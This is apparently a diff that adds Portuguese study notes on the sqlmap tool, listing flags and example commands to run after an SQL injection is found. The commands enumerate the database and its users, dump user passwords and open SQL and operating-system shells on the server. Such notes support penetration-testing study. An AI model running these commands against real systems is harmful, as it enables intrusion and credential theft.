@@ -1,0 +1,36 @@
+_________________
+\\OUTRAS OPÇÕES//
+-----------------
+
+Se o SQLmap encontrar uma vulnerabilidade de SQL Injection, podemos voltar a correr o comando com algumas flags que
+nos permitem visualizar informação do banco de dados. Vamos o SQLmap descobriu uma vulnerabilidade de SQL Injection a
+partir do seguinte comando: sqlmap -r /home/usuarioKali/Desktop/requisicao.txt
+
+------------------------------------------
+--current-db Permite obter o nome do banco de dados usado pela aplicação vulnerável
+Ex: sqlmap -r /home/usuarioKali/Desktop/requisicao.txt --current-db
+------------------------------------------
+--hostname Permite obter o nome de domínio do servidor do banco de dados
+Ex: sqlmap -r /home/usuarioKali/Desktop/requisicao.txt --hostname
+------------------------------------------
+--current-user Permite obter o nome do usuário com que a aplicação vulnerável está autenticada no banco de dados.
+Ex: sqlmap -r /home/usuarioKali/Desktop/requisicao.txt --current-user
+------------------------------------------
+--is-dba Permite saber se o usuário com que estamos autenticados é ou não administrador do banco de dados
+Ex: sqlmap -r /home/usuarioKali/Desktop/requisicao.txt --is-dba
+------------------------------------------
+--privileges Permite saber os privilégios do usuário com que estamos autenticados no banco de dados
+Ex: sqlmap -r /home/usuarioKali/Desktop/requisicao.txt --privileges
+------------------------------------------
+--users Permite obter os usernames de usuários do banco de dados
+Ex: sqlmap -r /home/usuarioKali/Desktop/requisicao.txt --users
+------------------------------------------
+--passwords Permite obter passwords de usuários do banco de dados
+Ex: sqlmap -r /home/usuarioKali/Desktop/requisicao.txt --passwords
+------------------------------------------
+--sql-shell Permite obter uma shell SQL para interagir com o banco de dados
+Ex: sqlmap -r /home/usuarioKali/Desktop/requisicao.txt --sql-shell
+------------------------------------------
+--os-shell Permite obter uma shell no servidor do banco de dados
+Ex: sqlmap -r /home/usuarioKali/Desktop/requisicao.txt --os-shell
+------------------------------------------
